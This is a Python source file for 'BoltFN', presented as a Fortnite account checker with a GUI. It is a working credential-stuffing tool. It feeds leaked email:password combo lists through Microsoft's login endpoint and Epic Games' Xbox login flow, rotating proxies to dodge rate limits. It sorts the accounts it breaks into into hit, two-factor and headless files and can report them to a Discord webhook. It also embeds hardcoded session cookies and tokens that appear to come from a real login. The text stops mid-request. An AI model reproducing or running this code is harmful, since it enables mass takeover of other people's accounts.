#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BoltFN GUI - Fortnite Account Checker with modern interface
Original logic by Shaggymop, GUI by CAT
"""

import sys
import os
import re
import time
import glob
import random
import threading
import queue
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

import requests
import cloudscraper
import yaml
import customtkinter as ctk
from tkinter import StringVar, IntVar, BooleanVar

# ----------------------------------------------------------------------
# Default configuration
DEFAULT_CONFIG = {
    'checker': {
        'print_fail': False,
        'print_ms_hit': False,
        'retries': 1,
        'timeout': 6000,
        'threads': 25,
        'save_bad': False,
        'display_mode': 'bolt',
        'import_from_file': False,
        'webhook': {
            'Webhook': False,
            'WebhookID': 'https://discordapp.com/api/webhooks/'
        },
        'proxy': {
            'proxy': False,
            'proxy_type': 'HTTP',
            'proxy_api': False,
            'api_link': ''
        }
    }
}

# ----------------------------------------------------------------------
# Helper functions
def ensure_directories():
    for d in ['config', 'combos', 'proxies', 'Results']:
        Path(d).mkdir(exist_ok=True)

def load_config():
    config_path = Path('config/config.yml')
    if not config_path.exists():
        with open(config_path, 'w') as f:
            yaml.dump(DEFAULT_CONFIG, f, default_flow_style=False)
    with open(config_path, 'r') as f:
        return yaml.safe_load(f)

def save_config(config):
    with open('config/config.yml', 'w') as f:
        yaml.dump(config, f, default_flow_style=False)

def time_used(start: float) -> str:
    return time.strftime("%H:%M:%S", time.gmtime(time.time() - start))

# ----------------------------------------------------------------------
# Stats and checker class
@dataclass
class Stats:
    hits: int = 0
    invalid: int = 0
    mshit: int = 0
    custom: int = 0
    locked: int = 0
    fnban: int = 0
    headless: int = 0
    epic2fa: int = 0
    xb: int = 0
    stw: int = 0
    og: int = 0
    retries: int = 0
    cpm: int = 0
    checked: int = 0
    total: int = 0
    start_time: float = 0.0
    sellerstuff: List[Dict] = field(default_factory=list)

class BoltChecker:
    def __init__(self, config: Dict, stats_update_callback=None, log_callback=None, progress_callback=None):
        self.config = config
        self.stats = Stats()
        self.stats.start_time = time.time()
        self.proxies: List[str] = []
        self.combos: List[str] = []
        self.folder: str = ""
        self.proxy_type = config['checker']['proxy']['proxy_type']
        self.use_proxy = config['checker']['proxy']['proxy']
        self.threads = config['checker']['threads']
        self.timeout = config['checker']['timeout'] / 1000
        self.retries = config['checker']['retries']
        self.save_bad = config['checker']['save_bad']
        self.webhook = config['checker']['webhook']['Webhook']
        self.webhook_id = config['checker']['webhook']['WebhookID']
        self.proxy_api = config['checker']['proxy']['proxy_api']
        self.proxy_api_link = config['checker']['proxy']['api_link']
        self.running = False
        self.stats_update_callback = stats_update_callback
        self.log_callback = log_callback
        self.progress_callback = progress_callback
        self.scraper = cloudscraper.create_scraper()
        self.print_lock = threading.Lock()

    def log(self, msg: str, level: str = "info"):
        if self.log_callback:
            self.log_callback(msg, level)

    def update_stats(self):
        if self.stats_update_callback:
            self.stats_update_callback(self.stats)

    def update_progress(self, value: float, desc: str = ""):
        if self.progress_callback:
            self.progress_callback(value, desc)

    # ------------------------------------------------------------------
    # Universal category saver
    def save_category(self, combo: str, category: str):
        """Save combo to a category folder inside the main results folder."""
        path = Path(self.folder) / category
        path.mkdir(parents=True, exist_ok=True)
        with open(path / f"{category}.txt", 'a', encoding='utf-8') as f:
            f.write(combo + '\n')

    # ------------------------------------------------------------------
    # Proxy loading
    def load_proxies(self) -> List[str]:
        proxies = []
        if self.proxy_api:
            try:
                r = requests.get(self.proxy_api_link, timeout=10)
                proxies = [line.strip() for line in r.text.splitlines() if line.strip()]
            except Exception as e:
                self.log(f"Failed to fetch proxies from API: {e}", "error")
        else:
            proxy_files = glob.glob('proxies/*.txt')
            if not proxy_files:
                self.log("No proxy files found in 'proxies/'.", "warning")
                return []
            for f in proxy_files:
                with open(f, 'r', encoding='utf-8', errors='ignore') as fp:
                    lines = fp.read().splitlines()
                    for line in lines:
                        line = line.strip()
                        if line and ':' in line:
                            proxies.append(line)
        proxies = list(dict.fromkeys(proxies))
        return proxies

    # ------------------------------------------------------------------
    # Combo loading
    def load_combos(self) -> List[str]:
        combos = []
        combo_files = glob.glob('combos/*.txt')
        if not combo_files:
            self.log("No combo files found in 'combos/'.", "warning")
            return []
        for f in combo_files:
            with open(f, 'r', encoding='utf-8', errors='ignore') as fp:
                lines = fp.read().splitlines()
                for line in lines:
                    line = line.strip()
                    if line and ':' in line:
                        combos.append(line)
        combos = list(dict.fromkeys(combos))
        return combos

    # ------------------------------------------------------------------
    # Proxy dict
    def get_proxy_dict(self, proxy: str) -> Optional[Dict[str, str]]:
        if not self.use_proxy or not proxy:
            return None
        if '@' in proxy:
            auth, addr = proxy.split('@', 1)
            user, pwd = auth.split(':', 1)
            if self.proxy_type.lower() in ('http', 'https'):
                return {'http': f'http://{user}:{pwd}@{addr}', 'https': f'http://{user}:{pwd}@{addr}'}
            else:
                return {'http': f'{self.proxy_type.lower()}://{user}:{pwd}@{addr}', 'https': f'{self.proxy_type.lower()}://{user}:{pwd}@{addr}'}
        else:
            if self.proxy_type.lower() in ('http', 'https'):
                return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            else:
                return {'http': f'{self.proxy_type.lower()}://{proxy}', 'https': f'{self.proxy_type.lower()}://{proxy}'}

    # ------------------------------------------------------------------
    # FULL check_account method (copied from original, with stats updates)
    def check_account(self, combo: str) -> Optional[Dict]:
        if ':' not in combo:
            return None
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        if not email or not password:
            return None

        sess = requests.Session()
        scraper = cloudscraper.create_scraper(sess)

        login_url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }
        payload = {
            "i13": "0",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "3",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "1",
            "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "21648"
        }

        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp = sess.post(login_url, headers=headers, data=payload, proxies=proxy_dict, timeout=self.timeout)
                if resp.status_code == 429:
                    time.sleep(1)
                    continue
                break
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        text = resp.text
        failure_keywords = [
            "Your account or password is incorrect.",
            "That Microsoft account doesn't exist.",
            "Sign in to your Microsoft account",
            "const trackingBase=",
            "Please sign in with a Microsoft account"
        ]
        ban_keywords = [",AC:null,urlFedConvertRename"]
        two_factor_keywords = [
            "account.live.com/recover?mkt",
            "recover?mkt",
            "account.live.com/identity/confirm?mkt",
            "Email/Confirm?mkt",
            "Help us protect your account"
        ]
        custom_keywords = ["/cancel?mkt=", "/Abuse?mkt="]

        result = 'Unknown'
        if any(k in text for k in failure_keywords):
            result = 'Failure'
        elif any(k in text for k in ban_keywords):
            result = 'Ban'
        elif any(k in text for k in two_factor_keywords):
            result = '2FACTOR'
        elif any(k in text for k in custom_keywords):
            result = 'CUSTOM'
        elif any(k in resp.cookies for k in ["ANON", "WLSSC"]) or \
             "https://login.live.com/oauth20_desktop.srf?" in resp.url or \
             "sSigninName" in text:
            result = 'Success'

        if result != 'Success':
            with self.print_lock:
                if result == 'Failure':
                    self.stats.invalid += 1
                    self.save_category(combo, "Invalid")
                elif result == '2FACTOR':
                    self.stats.custom += 1
                    self.save_category(combo, "TwoFactor")
                elif result == 'Ban':
                    self.stats.invalid += 1
                    self.save_category(combo, "Invalid")
                elif result == 'CUSTOM':
                    self.stats.locked += 1
                    self.save_category(combo, "Locked")
                else:
                    self.stats.invalid += 1
                    self.save_category(combo, "Invalid")
            return None

        # --- Success: now proceed to exchange code and retrieve Epic data ---
        match = re.search(r'urlPost":"(.*?)"', text)
        if not match:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None
        url_post = match.group(1).replace('\\', '')

        route_match = re.search(r"[&?]route=([^&]*)", url_post)
        route = route_match.group(1) if route_match else None
        if not route:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        o_params = sess.cookies.get('OParams')
        msa = sess.cookies.get('__Host-MSAAUTH')
        if not o_params or not msa:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        url2 = f'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216&opid=F7304AA192830107&route={route}'
        headers2 = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Length": "267",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; wlidperf=FR=L&ST=1701944522902; __Host-MSAAUTH={msa}; PPLState=1; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36a$uuid-dd8bae77-7811-4d1e-82dc-011f340afefe; OParams={o_params}",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp2 = sess.post(url2, headers=headers2, data=payload, proxies=proxy_dict, timeout=self.timeout)
                if resp2.status_code == 429:
                    time.sleep(1)
                    continue
                break
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        if 'id/oauth-authorized?code=' in resp2.url:
            with self.print_lock:
                self.stats.mshit += 1
            self.save_category(combo, "ValidMail")
            self.save_result(combo, 'Microsoft', 'Hits.txt')
            return None

        parsed = urllib.parse.urlparse(resp2.url)
        query = urllib.parse.parse_qs(parsed.query)
        code = query.get('code', [None])[0]
        if not code:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # --- Epic Games login with XBL code ---
        rep_url = "https://www.epicgames.com/id/api/reputation"
        headers_rep = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en;q=0.5",
            "Connection": "keep-alive",
            "DNT": "1",
            "Host": "www.epicgames.com",
            "Priority": "u=0, i",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_rep = scraper.get(rep_url, headers=headers_rep, proxies=proxy_dict, timeout=self.timeout)
                break
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        xsrf_token = resp_rep.cookies.get('XSRF-TOKEN')
        if not xsrf_token:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        xbl_url = "https://www.epicgames.com/id/api/external/xbl/login"
        xbl_payload = {"code": code}
        xbl_headers = {
            "Host": "www.epicgames.com",
            "Connection": "keep-alive",
            "X-Epic-Event-Category": "null",
            "X-XSRF-TOKEN": xsrf_token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 OPR/74.0.3911.107 (Edition utorrent)",
            "X-Epic-Event-Action": "null",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "X-Epic-Strategy-Flags": "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false",
            "Origin": "https://www.epicgames.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.epicgames.com/id/login/xbl?prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiJmN2MxODNkMzczYmQ0NzMxYTMxYjVjN2NlMGViNzE1ZSIsImlzV2ViIjp0cnVlLCJpcCI6IjE5Ny4yNi4xMzguMjE2IiwiaWQiOiIwMjEwYTIyNTcyMjU0ZDYzOTg1ZGFjOGU4NmM4MGVlZSIsImNvZGUiOiJNLlIzX0JBWS5mYzRjZGZjNi1iMTQ5LTNhN2YtYzZmNC1jZWMzY2Y3MDZmMDkifQ%253D%253D",
            "Accept-Language": "en-US,us;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_xbl = scraper.post(xbl_url, json=xbl_payload, headers=xbl_headers, cookies=resp_rep.cookies, proxies=proxy_dict, timeout=self.timeout)
                if resp_xbl.status_code == 200:
                    break
                if 'message":"Two-Factor authentication' in resp_xbl.text:
                    with self.print_lock:
                        self.stats.mshit += 1
                        self.stats.epic2fa += 1
                    self.save_category(combo, "TwoFactor")
                    self.save_result(combo, 'Microsoft', '2fa.txt')
                    return None
                if 'errorCode":"errors.com.epicgames.accountportal.account_headless' in resp_xbl.text:
                    with self.print_lock:
                        self.stats.hits += 1
                        self.stats.headless += 1
                    self.save_category(combo, "Headless")
                    self.save_result(combo, 'NoCapture', 'headless.txt')
                    return None
                if 'DATE_OF_BIRTH' in resp_xbl.text or 'message":"No account was found to log you in' in resp_xbl.text:
                    with self.print_lock:
                        self.stats.mshit += 1
                        self.stats.xb += 1
                    self.save_category(combo, "ValidMail")
                    self.save_result(combo, 'Microsoft', 'Xbox.txt')
                    return None
                if 'code is required' in resp_xbl.text:
                    continue
                else:
                    break
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # Redirect to get sid
        redirect_url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
        redirect_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Priority": "u=1, i",
            "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
            "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Epic-Access-Key": "undefined",
            "X-Epic-Client-Id": "875a3b57d3a640a6b7f9b4e883463ab4",
            "X-Epic-Display-Mode": "web",
            "X-Epic-Duration": "2173",
            "X-Epic-Event-Action": "external",
            "X-Epic-Event-Category": "login",
            "X-Epic-Flow": "login",
            "X-Epic-Idp-Provider": "xbl",
            "X-Epic-Platform": "WEB",
            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
            "X-Requested-With": "XMLHttpRequest",
            "X-Xsrf-Token": xsrf_token
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_redirect = scraper.get(redirect_url, headers=redirect_headers, cookies=resp_xbl.cookies, proxies=proxy_dict, timeout=self.timeout)
                if 'Sorry, your account has too many active logins' in resp_redirect.text:
                    with self.print_lock:
                        self.stats.hits += 1
                    self.save_category(combo, "Hit")
                    self.save_result(combo, 'NoCapture', 'logins.txt')
                    return None
                if '"sid":null,' in resp_redirect.text or 'Please fill your real email' in resp_redirect.text:
                    with self.print_lock:
                        self.stats.mshit += 1
                    self.save_category(combo, "ValidMail")
                    self.save_result(combo, 'Microsoft', 'XboxBan.txt')
                    return None
                sid = resp_redirect.json().get('sid')
                if sid:
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # SSO flow
        sso_url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
        sso_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Priority": "u=0, i",
